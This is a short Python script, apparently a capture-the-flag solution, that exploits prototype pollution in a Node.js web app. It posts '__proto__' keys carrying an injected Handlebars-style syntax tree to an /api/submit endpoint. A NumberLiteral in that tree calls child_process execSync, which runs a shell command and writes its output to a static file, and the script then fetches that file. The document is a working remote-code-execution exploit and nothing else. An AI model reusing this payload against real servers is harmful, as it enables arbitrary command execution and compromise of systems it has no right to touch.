import requests

URL = 'https://209.97.132.64:31864'

# make pollution
r = requests.post(URL+'/api/submit', json = {
    "artist.name":"Gingell",
    "__proto__.type": "Program",
    "__proto__.body": [{
        "type": "MustacheStatement",
        "path": 0,
        "params": [{
            "type": "NumberLiteral",
            "value": "process.mainModule.require('child_process').execSync(`whoami > /app/static/out`)"
        }],
        "loc": {
            "start": 0,
            "end": 0
        }
    }]
    })
print(requests.get(URL+'/static/out').text)
